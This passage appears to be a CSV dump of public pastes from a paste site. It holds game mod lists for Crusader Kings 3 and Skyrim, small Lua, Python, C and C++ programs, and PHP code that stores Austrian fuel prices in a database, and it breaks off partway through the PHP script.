id,title,username,language,date,content
rF4eWvSG,1.9.* Immersive mod list v.1,DavidBouchard1407,JSON,Saturday 22nd of July 2023 12:25:17 PM CDT,"{""game"":""ck3"",""mods"":[{""displayName"":""Debug Toggle (Less Invasive)"",""enabled"":true,""position"":0,""steamId"":""2264428428""},{""displayName"":""Ultimate Graphics Collection"",""enabled"":true,""position"":1,""steamId"":""2736168869""},{""displayName"":""Wasteland Border Colour Remover"",""enabled"":true,""position"":2,""steamId"":""2687816934""},{""displayName"":""Interaction Icon Project Full"",""enabled"":true,""position"":3,""steamId"":""2747794056""},{""displayName"":""Lowborn Shield Updated"",""enabled"":true,""position"":4,""steamId"":""2888270436""},{""displayName"":""Nameplates"",""enabled"":true,""position"":5,""steamId"":""2220762808""},{""displayName"":""Title-Ranked Portrait Borders"",""enabled"":true,""position"":6,""steamId"":""2234698756""},{""displayName"":""Clear Artifact Levels"",""enabled"":true,""position"":7,""steamId"":""2748508571""},{""displayName"":""Mass Demand Conversion"",""enabled"":true,""position"":8,""steamId"":""2753176859""},{""displayName"":""Alerts Manager"",""enabled"":true,""position"":9,""steamId"":""2996519353""},{""displayName"":""Configurable News Feed - Updated"",""enabled"":true,""position"":10,""steamId"":""2906140118""},{""displayName"":""Knight Manager Continued"",""enabled"":true,""position"":11,""steamId"":""2974850904""},{""displayName"":""Better UI Scaling"",""enabled"":true,""position"":12,""steamId"":""2217509277""},{""displayName"":""Character UI Overhaul"",""enabled"":true,""position"":13,""steamId"":""2519175282""},{""displayName"":""Rename Tribal Era to Late Antiquity"",""enabled"":true,""position"":14,""steamId"":""2629092890""},{""displayName"":""Auto-Pause on council task complete"",""enabled"":true,""position"":15,""steamId"":""2523700148""},{""displayName"":""Multilingual Education"",""enabled"":true,""position"":16,""steamId"":""2756456587""},{""displayName"":""Better AI Education"",""enabled"":true,""position"":17,""steamId"":""2753934263""},{""displayName"":""Better Marriage (AI)"",""enabled"":true,""position"":18,""steamId"":""2749533543""},{""displayName"":""Found Universities Anywhere"",""enabled"":true,""position"":19,""steamId"":""2758929181""},{""displayName"":""Basic Nessassities - Happy Heraldry"",""enabled"":true,""position"":20,""steamId"":""2243137897""},{""displayName"":""Councillor's experience trait"",""enabled"":true,""position"":21,""steamId"":""2721974781""},{""displayName"":""Petty Inheritable Traits"",""enabled"":true,""position"":22,""steamId"":""2394747105""},{""displayName"":""Farewell, Chaplain!"",""enabled"":true,""position"":23,""steamId"":""2453009990""},{""displayName"":""Pervasive Crown Authority"",""enabled"":true,""position"":24,""steamId"":""2692957667""},{""displayName"":""Prisoners of War"",""enabled"":true,""position"":25,""steamId"":""2511247871""},{""displayName"":""A Spouse Designer for 1.9.*"",""enabled"":true,""position"":26,""steamId"":""2829316015""},{""displayName"":""Missionaries"",""enabled"":true,""position"":27,""steamId"":""2848003204""},{""displayName"":""Search & Trade Artifacts"",""enabled"":true,""position"":28,""steamId"":""2962238514""},{""displayName"":""Social Relations Expanded (SRE)"",""enabled"":true,""position"":29,""steamId"":""2825977309""},{""displayName"":""Unfinished Business"",""enabled"":true,""position"":30,""steamId"":""2829009590""},{""displayName"":""Hiraeth - Dynasty Legacies Overhaul"",""enabled"":true,""position"":31,""steamId"":""2697392271""},{""displayName"":""Compability Historic Invasions Hiraeth"",""enabled"":true,""position"":32,""steamId"":""2912717592""},{""displayName"":""Historic Invasions"",""enabled"":true,""position"":33,""steamId"":""2837398670""},{""displayName"":""Better Rebellions"",""enabled"":true,""position"":34,""steamId"":""2921911789""},{""displayName"":""More Interactive Vassals"",""enabled"":true,""position"":35,""steamId"":""2712590542""},{""displayName"":""Succession Expanded"",""enabled"":true,""position"":36,""steamId"":""2650385452""},{""displayName"":""Foundational Framework"",""enabled"":true,""position"":37,""steamId"":""2975079361""},{""displayName"":""VIET Events - A Flavor and Immersion Event Mod"",""enabled"":true,""position"":38,""steamId"":""2227658180""},{""displayName"":""Community Title Project"",""enabled"":true,""position"":39,""steamId"":""2216919487""},{""displayName"":""Medieval Arts"",""enabled"":true,""position"":40,""steamId"":""2452585382""},{""displayName"":""Cities of Wonder 3"",""enabled"":true,""position"":41,""steamId"":""2901477267""},{""displayName"":""Muslim Enhancements"",""enabled"":true,""position"":42,""steamId"":""2241658518""}],""name"":""1.9.* immersive mod list v.1""}"
Q8iKeAnG,sd,vuseless,HTML,Saturday 22nd of July 2023 12:17:21 PM CDT,"strawpoll.de/g8w4xd9
strawpoll.de/564w1yw
strawpoll.de/xfxsa2y
strawpoll.de/6e4637s
strawpoll.de/78x6zfy"
pf83gUUS,Untitled,MagmaLP,Lua,Saturday 22nd of July 2023 12:13:37 PM CDT,"mon = peripheral.wrap(""top"")
mon.setTextScale(1)
mon.setBackgroundColor(256)
mon.setCursorPos(1,1)
mon.clear()

function calc_color(color)
    return math.pow(2, color - 1)
end
function msg(gap, line, color, groundb, text) 
    mon.setBackgroundColor(calc_color(groundb))
    mon.setCursorPos(gap,line)
    mon.setTextColor(calc_color(color))
    text = mon.write(text)
end

msg(01,01,01,08,"" Springfield "")
msg(01,02,01,08,""Nuclear Power"")
msg(01,03,01,08,""    Plant    "")"
LuivWT05,Untitled,migero,Python,Saturday 22nd of July 2023 11:52:44 AM CDT,"import bpy
import csv
from mathutils import Vector

def import_delta_vertices(filepath):
    # Retrieve the vertex positions from the CSV file
    vertices = [] 
    with open(filepath, newline='') as csvfile:
        reader = csv.reader(csvfile)
        next(reader)  # Skip the header line
        for row in reader:
            vertex_index = int(row[0])
            delta_x = float(row[1])
            delta_y = float(row[2])
            delta_z = float(row[3])
            
            # Convert the delta values to a Vector
            delta_vector = Vector((delta_x, delta_y, delta_z))
            
            # Store the delta vertex position
            vertices.append(delta_vector)

    # Create a new mesh object for the point cloud
    mesh = bpy.data.meshes.new(""VertexPositions"")
    obj = bpy.data.objects.new(""VertexPositions"", mesh)

    # Get the active scene
    scene = bpy.context.scene

    # Link the object to the scene
    scene.objects.link(obj)

    # Select and make the object active
    obj.select = True
    scene.objects.active = obj

    # Enter Edit Mode to add vertices
    bpy.ops.object.mode_set(mode='EDIT')
    bpy.ops.mesh.select_all(action='SELECT')
    bpy.ops.mesh.delete(type='VERT')

    # Exit Edit Mode to avoid potential issues
    bpy.ops.object.mode_set(mode='OBJECT')

    # Add the vertices to the mesh
    mesh.from_pydata(vertices, [], [])
    mesh.update()

    print(""Vertex positions imported successfully."")

csv_file_path = 'D:/test.csv'
import_delta_vertices(csv_file_path)


"
zN9qha5x,SkyrimSE Modlist 2023-07-22,Ubda,HTML,Saturday 22nd of July 2023 11:45:16 AM CDT,"""SKSE_separator"",-1,""""
""SKSE64"",0,""""
""Address Library for SKSE Plugins"",32444,""https://www.nexusmods.com/skyrimspecialedition/mods/32444""
""PapyrusUtil SE - Modders Scripting Utility Functions"",13048,""https://www.nexusmods.com/skyrimspecialedition/mods/13048""
""Animation Queue Fix"",82395,""https://www.nexusmods.com/skyrimspecialedition/mods/82395""
""powerofthree's Tweaks"",51073,""https://www.nexusmods.com/skyrimspecialedition/mods/51073""
""Open Animation Replacer"",92109,""https://www.nexusmods.com/skyrimspecialedition/mods/92109""
""Sound Record Distributor"",77815,""https://www.nexusmods.com/skyrimspecialedition/mods/77815""
""SSE Engine Fixes (skse64 plugin)"",17230,""https://www.nexusmods.com/skyrimspecialedition/mods/17230""
""Spell Perk Item Distributor"",36869,""https://www.nexusmods.com/skyrimspecialedition/mods/36869""
""Keyword Item Distributor"",55728,""https://www.nexusmods.com/skyrimspecialedition/mods/55728""
""powerofthree's Papyrus Extender"",22854,""https://www.nexusmods.com/skyrimspecialedition/mods/22854""
""MCM Helper"",53000,""https://www.nexusmods.com/skyrimspecialedition/mods/53000""
""Enhanced Volumetric Lighting and Shadows (EVLaS)"",63725,""https://www.nexusmods.com/skyrimspecialedition/mods/63725""
""Moons And Stars - Sky Overhaul SKSE"",73336,""https://www.nexusmods.com/skyrimspecialedition/mods/73336""
""ENB Helper SE"",23174,""https://www.nexusmods.com/skyrimspecialedition/mods/23174""
""Base Object Swapper"",60805,""https://www.nexusmods.com/skyrimspecialedition/mods/60805""
""UI_separator"",-1,""""
""SkyUI"",12604,""https://www.nexusmods.com/skyrimspecialedition/mods/12604""
""SkyUI - Survival Mode Integration"",17729,""https://www.nexusmods.com/skyrimspecialedition/mods/17729""
""SkyUI SE - Flashing Savegames Fix"",20406,""https://www.nexusmods.com/skyrimspecialedition/mods/20406""
""Better Dialogue Controls"",1429,""https://www.nexusmods.com/skyrimspecialedition/mods/1429""
""UIExtensions"",17561,""https://www.nexusmods.com/skyrimspecialedition/mods/17561""
""moreHUD SE"",12688,""https://www.nexusmods.com/skyrimspecialedition/mods/12688""
""moreHUD Inventory Edition"",18619,""https://www.nexusmods.com/skyrimspecialedition/mods/18619""
""Immersive HUD - iHUD Special Edition"",12440,""https://www.nexusmods.com/skyrimspecialedition/mods/12440""
""SKSE 2_separator"",-1,""""
""Classic Sprinting Redone (SKSE64)"",20166,""https://www.nexusmods.com/skyrimspecialedition/mods/20166""
""Enhanced Reanimation"",43500,""https://www.nexusmods.com/skyrimspecialedition/mods/43500""
""Vampires Cast No Shadow"",46107,""https://www.nexusmods.com/skyrimspecialedition/mods/46107""
""Splashes Of Storms"",72115,""https://www.nexusmods.com/skyrimspecialedition/mods/72115""
""Rudy fix for Splashes of Storms and ENB"",72985,""https://www.nexusmods.com/skyrimspecialedition/mods/72985""
""Name Those Ashpiles"",24701,""https://www.nexusmods.com/skyrimspecialedition/mods/24701""
""SKSE Settings"",0,""""
""SkyUI Settings"",0,""""
""Patches_separator"",-1,""""
""Unofficial Skyrim Special Edition Patch"",266,""https://www.nexusmods.com/skyrimspecialedition/mods/266""
""Survival Mode USSEP Patch"",58348,""https://www.nexusmods.com/skyrimspecialedition/mods/58348""
""Unofficial Skyrim Modder's Patch - USMP SE"",49616,""https://www.nexusmods.com/skyrimspecialedition/mods/49616""
""Unofficial Skyrim Creation Club Content Patch"",18975,""https://www.nexusmods.com/skyrimspecialedition/mods/18975""
""Animations_separator"",-1,""""
""Project New Reign - Nemesis Unlimited Behavior Engine"",60033,""https://www.nexusmods.com/skyrimspecialedition/mods/60033""
""Nemesis Engine Cache"",0,""""
""Overhaul_separator"",-1,""""
""AI Overhaul SSE"",21654,""https://www.nexusmods.com/skyrimspecialedition/mods/21654""
""RS Children Overhaul"",2650,""https://www.nexusmods.com/skyrimspecialedition/mods/2650""
""Sleeping Expanded - Animations and NPC reactions"",59250,""https://www.nexusmods.com/skyrimspecialedition/mods/59250""
""JK's Skyrim"",6289,""https://www.nexusmods.com/skyrimspecialedition/mods/6289""
""Khajiit Has Wares - A Caravan Camp Overhaul"",73500,""https://www.nexusmods.com/skyrimspecialedition/mods/73500""
""Project ja-Kha'jay"",57610,""https://www.nexusmods.com/skyrimspecialedition/mods/57610""
""Immersive Fort Dawnguard"",40436,""https://www.nexusmods.com/skyrimspecialedition/mods/40436""
""Immersion_separator"",-1,""""
""Footprints"",3808,""https://www.nexusmods.com/skyrimspecialedition/mods/3808""
""More Hircinic Aspects of Hircine- Mihail's Shards of Immersion (SE-AE version)"",89917,""https://www.nexusmods.com/skyrimspecialedition/mods/89917""
""Random Barrel Roll - Base Object Swapper"",78195,""https://www.nexusmods.com/skyrimspecialedition/mods/78195""
""Gameplay_separator"",-1,""""
""No Force for Illusion Spells"",38700,""https://www.nexusmods.com/skyrimspecialedition/mods/38700""
""Less Tedious Thieves Guild"",6581,""https://www.nexusmods.com/skyrimspecialedition/mods/6581""
""Guard Dialogue Overhaul SE"",22075,""https://www.nexusmods.com/skyrimspecialedition/mods/22075""
""VioLens - A Killmove Mod SE"",668,""https://www.nexusmods.com/skyrimspecialedition/mods/668""
""Predator Vision - Night Eye and Thermal Vision Overhaul"",2777,""https://www.nexusmods.com/skyrimspecialedition/mods/2777""
""Timing is Everything SE"",25464,""https://www.nexusmods.com/skyrimspecialedition/mods/25464""
""Timing is Everything SE - Settings Loader"",57754,""https://www.nexusmods.com/skyrimspecialedition/mods/57754""
""The Choice is Yours"",3850,""https://www.nexusmods.com/skyrimspecialedition/mods/3850""
""OBIS SE - Organized Bandits In Skyrim Special Edition"",4145,""https://www.nexusmods.com/skyrimspecialedition/mods/4145""
""Companions_separator"",-1,""""
""INIGO"",1461,""https://www.nexusmods.com/skyrimspecialedition/mods/1461""
""Meshes_separator"",-1,""""
""XP32 Maximum Skeleton Special Extended"",1988,""https://www.nexusmods.com/skyrimspecialedition/mods/1988""
""Simple Dual Sheath"",50049,""https://www.nexusmods.com/skyrimspecialedition/mods/50049""
""Immersive Equipment Displays"",62001,""https://www.nexusmods.com/skyrimspecialedition/mods/62001""
""Armor and Weapons_separator"",-1,""""
""IPM - Insane Armory"",2025,""https://www.nexusmods.com/skyrimspecialedition/mods/2025""
""LeanWolf's Better-Shaped Weapons SE"",2017,""https://www.nexusmods.com/skyrimspecialedition/mods/2017""
""Believable weapons"",37737,""https://www.nexusmods.com/skyrimspecialedition/mods/37737""
""Improved Closefaced Helmets (SSE)"",824,""https://www.nexusmods.com/skyrimspecialedition/mods/824""
""Better Looking Ebony Helmet - Fixed and Improved"",17960,""https://www.nexusmods.com/skyrimspecialedition/mods/17960""
""Knight Armor - Ebony Armor Edit"",17960,""https://www.nexusmods.com/skyrimspecialedition/mods/17960""
""Practical Female Armors"",2628,""https://www.nexusmods.com/skyrimspecialedition/mods/2628""
""Heavy Legion SSE"",22877,""https://www.nexusmods.com/skyrimspecialedition/mods/22877""
""Guards Armor Replacer SSE"",22671,""https://www.nexusmods.com/skyrimspecialedition/mods/22671""
""Crimson Ranger Armor for SE"",11091,""https://www.nexusmods.com/skyrimspecialedition/mods/11091""
""Bosmer Armor Pack"",5597,""https://www.nexusmods.com/skyrimspecialedition/mods/5597""
""Unique Uniques SE"",3334,""https://www.nexusmods.com/skyrimspecialedition/mods/3334""
""Zim's Immersive Artifacts"",9138,""https://www.nexusmods.com/skyrimspecialedition/mods/9138""
""Creatures_separator"",-1,""""
""Male Giant Variety- Mihail Monsters and Animals (SE-AE version)"",83530,""https://www.nexusmods.com/skyrimspecialedition/mods/83530""
""Female Giants and Younglings- Mihail Monsters and Animals (SE-AE version) (''giantess'')"",75503,""https://www.nexusmods.com/skyrimspecialedition/mods/75503""
""Splendor - Dragon Variants SE"",9670,""https://www.nexusmods.com/skyrimspecialedition/mods/9670""
""Diverse Dragons Collection SE (DDCse)"",695,""https://www.nexusmods.com/skyrimspecialedition/mods/695""
""Kagouti- Mihail Monsters and Animals (SE-AE version) (''morrowind'')"",27521,""https://www.nexusmods.com/skyrimspecialedition/mods/27521""
""Kagoutis and Guars- Mihail Monsters and Animals (SE-AE version) (''morrowind'')"",89558,""https://www.nexusmods.com/skyrimspecialedition/mods/89558""
""Chickens and Chicks- Mihail Monsters and Animals (SE-AE version)"",92658,""https://www.nexusmods.com/skyrimspecialedition/mods/92658""
""Imps - Mihail Monsters and Animals (SE-AE version) (''oblivion'')"",33759,""https://www.nexusmods.com/skyrimspecialedition/mods/33759""
""Graphics_separator"",-1,""""
""Project Clarity AIO Full Res BSA Pt 1"",45306,""https://www.nexusmods.com/skyrimspecialedition/mods/45306""
""Project Clarity AIO Full Res BSA Pt 2"",45306,""https://www.nexusmods.com/skyrimspecialedition/mods/45306""
""Project Clarity AIO Full Res BSA Pt 3"",45306,""https://www.nexusmods.com/skyrimspecialedition/mods/45306""
""Noble Skyrim Mod HD-2K"",21423,""https://www.nexusmods.com/skyrimspecialedition/mods/21423""
""High Poly Project - 4k Textures"",12029,""https://www.nexusmods.com/skyrimspecialedition/mods/12029""
""HD Remastered Landscapes - 8k"",94835,""https://www.nexusmods.com/skyrimspecialedition/mods/94835""
""Authentic Mountains and Rocks 4K"",22069,""https://www.nexusmods.com/skyrimspecialedition/mods/22069""
""HD Remastered Blended Roads 8k"",63674,""https://www.nexusmods.com/skyrimspecialedition/mods/63674""
""Northern Grass SE"",25459,""https://www.nexusmods.com/skyrimspecialedition/mods/25459""
""RUSTIC CLUTTER COLLECTION - Special Edition"",5795,""https://www.nexusmods.com/skyrimspecialedition/mods/5795""
""Graphics SMIM_separator"",-1,""""
""Static Mesh Improvement Mod"",659,""https://www.nexusmods.com/skyrimspecialedition/mods/659""
""Riekling Barrels SMIM"",43306,""https://www.nexusmods.com/skyrimspecialedition/mods/43306""
""Skyrim Objects SMIMed - Glazed and Nordic Pottery"",69487,""https://www.nexusmods.com/skyrimspecialedition/mods/69487""
""Skyrim Objects SMIMed - Farm Mills"",94150,""https://www.nexusmods.com/skyrimspecialedition/mods/94150""
""Solstheim Objects SMIMed - High Poly Dark Elf Furniture"",53779,""https://www.nexusmods.com/skyrimspecialedition/mods/53779""
""Skyrim Objects SMIMed - Noble Furniture"",77499,""https://www.nexusmods.com/skyrimspecialedition/mods/77499""
""Solitude Objects SMIMed - festival ropes"",68115,""https://www.nexusmods.com/skyrimspecialedition/mods/68115""
""Visual_separator"",-1,""""
""Realistic Water Two SE"",2182,""https://www.nexusmods.com/skyrimspecialedition/mods/2182""
""Enhanced Blood Textures"",2357,""https://www.nexusmods.com/skyrimspecialedition/mods/2357""
""Frozen Electrocuted Combustion"",3532,""https://www.nexusmods.com/skyrimspecialedition/mods/3532""
""Grindstones - 10X Sparks"",19831,""https://www.nexusmods.com/skyrimspecialedition/mods/19831""
""See Enchantments SE (Visual Weapon Effects)"",4963,""https://www.nexusmods.com/skyrimspecialedition/mods/4963""
""High Poly Blackreach Mushrooms"",40418,""https://www.nexusmods.com/skyrimspecialedition/mods/40418""
""Enhanced Lights and FX"",2424,""https://www.nexusmods.com/skyrimspecialedition/mods/2424""
""Vibrant weapons - Fire Frost Shock"",40087,""https://www.nexusmods.com/skyrimspecialedition/mods/40087""
""Impact Effects - Vanilla Sparks"",19831,""https://www.nexusmods.com/skyrimspecialedition/mods/19831""
""Fixed Mesh Lighting"",53653,""https://www.nexusmods.com/skyrimspecialedition/mods/53653""
""Graphics 2_separator"",-1,""""
""Terre's 4K Fur Textures for CoverKhajiits"",76568,""https://www.nexusmods.com/skyrimspecialedition/mods/76568""
""Mari's flora"",45952,""https://www.nexusmods.com/skyrimspecialedition/mods/45952""
""CoverKhajiits - Face Textures 4K SE"",71067,""https://www.nexusmods.com/skyrimspecialedition/mods/71067""
""Better Claws and Gauntlets SSE"",12595,""https://www.nexusmods.com/skyrimspecialedition/mods/12595""
""Better Beast Scars 2K"",72458,""https://www.nexusmods.com/skyrimspecialedition/mods/72458""
""Vampire Lord eyes glowing red"",70670,""https://www.nexusmods.com/skyrimspecialedition/mods/70670""
""FZmx - HIMBO - Better Claws and Gauntlets Refit"",62078,""https://www.nexusmods.com/skyrimspecialedition/mods/62078""
""Weapons Armor Clothing and Clutter Fixes"",18994,""https://www.nexusmods.com/skyrimspecialedition/mods/18994""
""UHD Dawnguard Vampire Eyes - Argonian Khajiit and Human"",24722,""https://www.nexusmods.com/skyrimspecialedition/mods/24722""
""aMidianBorn Book of Silence SE"",35382,""https://www.nexusmods.com/skyrimspecialedition/mods/35382""
""aMidianBorn Book of Silence SE -- CCOR CONTENT ADDON"",35382,""https://www.nexusmods.com/skyrimspecialedition/mods/35382""
""aMidianBorn Content Addon SE - No CCOR Requirement"",35390,""https://www.nexusmods.com/skyrimspecialedition/mods/35390""
""Frankly HD Dawnguard Armor and Weapons"",19663,""https://www.nexusmods.com/skyrimspecialedition/mods/19663""
""Sigils of Shalidor"",14103,""https://www.nexusmods.com/skyrimspecialedition/mods/14103""
""Bellyaches HD Dragon Replacer Pack (SE)"",2636,""https://www.nexusmods.com/skyrimspecialedition/mods/2636""
""HD Serpentine Dragon and Mesh Fix SE"",18370,""https://www.nexusmods.com/skyrimspecialedition/mods/18370""
""ALDUIN THE WORLD-EATER"",88135,""https://www.nexusmods.com/skyrimspecialedition/mods/88135""
""High Poly Vanilla Hair"",41863,""https://www.nexusmods.com/skyrimspecialedition/mods/41863""
""Burnt Corpses 4k Retexture- Mihail's Shards of Immersion (SE-AE version)"",89747,""https://www.nexusmods.com/skyrimspecialedition/mods/89747""
""Nocturnal's Birds Replacer- Mihail's Shards of Immersion (SE-AE) (''crow'')"",82995,""https://www.nexusmods.com/skyrimspecialedition/mods/82995""
""High-Res Dartwing (Dragonfly) Texture"",37668,""https://www.nexusmods.com/skyrimspecialedition/mods/37668""
""Forgotten Argonian Roots"",1704,""https://www.nexusmods.com/skyrimspecialedition/mods/1704""
""Medieval Spirits"",24243,""https://www.nexusmods.com/skyrimspecialedition/mods/24243""
""High Poly Soul Husks for cunny1975's textures"",47891,""https://www.nexusmods.com/skyrimspecialedition/mods/47891""
""4K Soul Husk"",41987,""https://www.nexusmods.com/skyrimspecialedition/mods/41987""
""HD Dead Trees and Driftwoods 4K"",35308,""https://www.nexusmods.com/skyrimspecialedition/mods/35308""
""Visual 2_separator"",-1,""""
""Obsidian Weathers and Seasons"",12125,""https://www.nexusmods.com/skyrimspecialedition/mods/12125""
""Water for ENB"",37061,""https://www.nexusmods.com/skyrimspecialedition/mods/37061""
""Particle Patch for ENB"",65720,""https://www.nexusmods.com/skyrimspecialedition/mods/65720""
""Less Distracting Blowing Snow Effects for ENB Particle Patch"",36198,""https://www.nexusmods.com/skyrimspecialedition/mods/36198""
""Water for ENB Particle Patch"",37956,""https://www.nexusmods.com/skyrimspecialedition/mods/37956""
""EVLaS Skyrim Underside"",63725,""https://www.nexusmods.com/skyrimspecialedition/mods/63725""
""Embers XD"",37085,""https://www.nexusmods.com/skyrimspecialedition/mods/37085""
""Rudy ENB Obsidian Weathers ADDONS and REQUiRED Files"",4796,""https://www.nexusmods.com/skyrimspecialedition/mods/4796""
""Audio and Voices_separator"",-1,""""
""Daedric Enigma -Daedric Princes Voice Rework- SSE"",35529,""https://www.nexusmods.com/skyrimspecialedition/mods/35529""
""Flies Around Corpses- Mihail's Shards of Immersion (SE-AE version)"",88367,""https://www.nexusmods.com/skyrimspecialedition/mods/88367""
""Sinding's Werewolf Voice Overhaul- Mihail NPCs and Followers (SE-AE version)"",88230,""https://www.nexusmods.com/skyrimspecialedition/mods/88230""
""Patches 2_separator"",-1,""""
""Survival Mode Patch 09 - Amidianborn Content Addon"",19154,""https://www.nexusmods.com/skyrimspecialedition/mods/19154""
""JKs Skyrim - AI Overhaul SSE Patch"",34194,""https://www.nexusmods.com/skyrimspecialedition/mods/34194""
""Better Claws and Gauntlets - Better Custom Beast Race Compatibility"",65041,""https://www.nexusmods.com/skyrimspecialedition/mods/65041""
""kryptopyr's Automated Patches"",19518,""https://www.nexusmods.com/skyrimspecialedition/mods/19518""
""KagoutiCurios Patch"",0,""""
""KagoutiGuarCurios Patch"",0,""""
""Last Patches_separator"",-1,""""
""Smashed Patch"",0,""""
""DynDOLOD 3_separator"",-1,""""
""DynDOLOD Resources SE"",52897,""https://www.nexusmods.com/skyrimspecialedition/mods/52897""
""DynDOLOD DLL SE - SKSE64 Plugin"",57264,""https://www.nexusmods.com/skyrimspecialedition/mods/57264""
""DynDOLOD DLL SE - Scripts"",57264,""https://www.nexusmods.com/skyrimspecialedition/mods/57264""
""Happy Little Trees Add-On - DynDOLOD 3"",56907,""https://www.nexusmods.com/skyrimspecialedition/mods/56907""
""SSEEdit_separator"",-1,""""
""SSEEdit Cache"",0,""""
""SSEEdit Backup"",0,""""
"
FQCWN3Bw,Programming Contest Template C++,parthosutradhor,C++,Saturday 22nd of July 2023 11:40:21 AM CDT,"// Author: Partho Sutra Dhor (pie)

#include <bits/stdc++.h>
#include <unordered_map>
#include <unordered_set>
using namespace std;

#define Partho      ios_base::sync_with_stdio(0),cin.tie(0),cout.tie(0)
#define del_nl      cin.ignore(numeric_limits<streamsize>::max(), '\n');

#define int         long long
#define double      long double
#define vi          vector<int>
#define vb          vector<bool>
#define vc          vector<char>
#define vs          vector<string>
#define vpii        vector<pair<int,int>>

#define mpii        map<int, int>
#define mpsi        map<string, int>
#define mpci        map<char, int>
#define mpss        map<string, string>

#define umpii       unordered_map<int, int>
#define umpsi       unordered_map<string, int>
#define umpci       unordered_map<char, int>
#define umpss       unordered_map<string, string>

#define nl          (""\n"")
#define pb(n)       push_back(n)
#define ff          first
#define ss          second
#define sz(s)       (long long)(s.size())
#define all(v)      (v).begin(),(v).end()
#define in(v)       for(auto &item : v) cin>>item;
#define inp(v)      for(auto &item : v) cin>>item.ff>>item.ss;
#define fr(a,b,c)   for(int a=b;a<c;a++)
#define rfr(a,b,c)  for(int a=b;a>c;a--)
#define ifr(v)      for(auto item : v)

const double        PI = 3.1415926535;
const int           inf = 1e18;
const int           mod = 1000000007;

/*---------------------------------------------------------------------------------------------------------------------------*/
int modadd(int a, int b, int m) { a %= m; b %= m; return (a + b) % m; }
int modmul(int a, int b, int m) { a %= m; b %= m; return (a * b) % m; }
int modsub(int a, int b, int m) { a %= m; b %= m; return (a - b + m) % m; }
int gcd(int a, int b) { if (b == 0) return a; return gcd(b, a % b); }
int expo(int a, int n, int md) { int res = 1; while (n) { if (n & 1) { res = modmul(res, a, md); --n; } else { a = modmul(a, a, md); n >>= 1; } } return res; }
int expo(int a, int n) { int res = 1; while (n) { if (n & 1) { res *= a; --n; } else { a *= a; n >>= 1; } } return res; }
vb sieve(int n) { vb prime(n + 1, 1); prime[0] = prime[1] = 0; for (int i = 2; i * i <= n; i++) { if (prime[i]) { for (int j = i * i; j <= n; j += i) prime[j] = 0; } } return prime; }
bool is_prime(int n) {if (n < 2) return false;if (n == 2) return true;if (n % 2 == 0) return false;for (int i = 3; i * i <= n; i = i + 2) {if (n % i == 0) return false;}return true;}
/*---------------------------------------------------------------------------------------------------------------------------*/






void solve(int T)
{

    int n, i, j;













}



signed main(){Partho;int T = 1;
    cin >> T; // Comment this if you need only one test case.
    for (int i = 1; i <= T; i++) {solve(i);} return 0;}
"
S8jYNWyT,JSON,wofus,JSON,Saturday 22nd of July 2023 11:28:24 AM CDT,"array(1) {
  [0]=>
  array(3) {
    [""bm_lagerhaus_tankstelle""]=>
    array(5) {
      [""zeit""]=>
      string(19) ""2023-07-22 17:17:07""
      [""tankstelle""]=>
      string(19) ""Landmarkt Lagerhaus""
      [""adresse""]=>
      string(9) ""Thörl 66""
      [""preis""]=>
      string(5) ""1.569""
      [""treibstoff""]=>
      string(6) ""Diesel""
    }
    [""liezen_jet_tankstelle""]=>
    array(5) {
      [""zeit""]=>
      string(19) ""2023-07-22 17:17:15""
      [""tankstelle""]=>
      string(14) ""JET TANKSTELLE""
      [""adresse""]=>
      string(18) ""GESÄUSESTRASSE 33""
      [""preis""]=>
      string(5) ""1.534""
      [""treibstoff""]=>
      string(6) ""Diesel""
    }
    [""trautenfels_shell_tankstelle""]=>
    array(5) {
      [""zeit""]=>
      string(19) ""2023-07-22 17:17:20""
      [""tankstelle""]=>
      string(13) ""Shell Austria""
      [""adresse""]=>
      string(9) ""NUMMER 46""
      [""preis""]=>
      string(1) ""0""
      [""treibstoff""]=>
      string(12) ""Keine Daten!""
    }
  }
}
"
q9B3qCNq,mergesort,STANAANDREY,C,Saturday 22nd of July 2023 11:28:14 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#define NMAX 10001

void readArr(int n, int arr[NMAX]) {
    for (int i = 0; i < n; i++) {
        scanf(""%d"", &arr[i]);
    }
}

void printArr(int n, const int arr[NMAX]) {
    for (int i = 0; i < n; i++) {
        printf(""%d "", arr[i]);
    }
    putchar('\n');
}

void merge(int arr[NMAX], int le, int mid, int ri) {
    int n1 = mid - le + 1;
    int n2 = ri - mid;
    int leArr[n1], riArr[n2 + 1];

    for (int i = 0; i < n1; i++) {
        leArr[i] = arr[le + i];
    }
    for (int i = 0; i < n2; i++) {
        riArr[i] = arr[mid + 1 + i];
    }

    int i = 0, j = 0, k = le;
    while (i < n1 && j < n2) {
        if (leArr[i] <= riArr[j]) {
            arr[k++] = leArr[i++];
        } else {
            arr[k++] = riArr[j++];
        }
    }
    while (i < n1) {
        arr[k++] = leArr[i++];
    }
    while (j < n2) {
        arr[k++] = riArr[j++];
    }
}

void mergeSort(int arr[NMAX], int le, int ri) {
    if (le < ri) {
        int mid = le + (ri - le) / 2;
        mergeSort(arr, le, mid);
        mergeSort(arr, mid + 1, ri);
        merge(arr, le, mid, ri);
    }
}

int main() {
    int n;
    scanf(""%d"", &n);
    static int arr[NMAX];
    readArr(n, arr);

    mergeSort(arr, 0, n - 1);

    printArr(n, arr);
    return 0;
}"
01SSnyw6,Skript zum auslesen der 1 Datenbank und zum senden,wofus,PHP,Saturday 22nd of July 2023 11:23:41 AM CDT,"<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

// Rohdaten des HTTP-POST-Body lesen
$json_data = file_get_contents('php://input');

// POST-Daten als JSON decodieren und in ein assoziatives Array umwandeln
$data = json_decode($json_data, true);

// Zum Testen, ob die Daten erfolgreich decodiert wurden
var_dump($data);

// Überprüfen der POST-Daten
if (empty($data)) {
    die(""Fehler: Fehlende POST-Daten."");
} else {
    // Verbindung zur MySQL-Datenbank herstellen
    require_once 'connect.php';

    // SQL-Abfragen zum Einfügen der Daten in verschiedene Tabellen
    $sql_1 = ""INSERT INTO bm_lagerhaus_tankstelle (Zeit, Tankstelle, Adresse, Preis, Treibstoff) VALUES (:zeit1, :tankstelle, :adresse, :preis, :treibstoff)"";
    $sql_2 = ""INSERT INTO liezen_jet_tankstelle (Zeit, Tankstelle, Adresse, Preis, Treibstoff) VALUES (:zeit, :tankstelle, :adresse, :preis, :treibstoff)"";
    $sql_3 = ""INSERT INTO trautenfels_shell_tankstelle (Zeit, Tankstelle, Adresse, Preis, Treibstoff) VALUES (:zeit, :tankstelle, :adresse, :preis, :treibstoff)"";

    try {
        global $pdo;

        // Daten für bm_lagerhaus_tankstelle einfügen
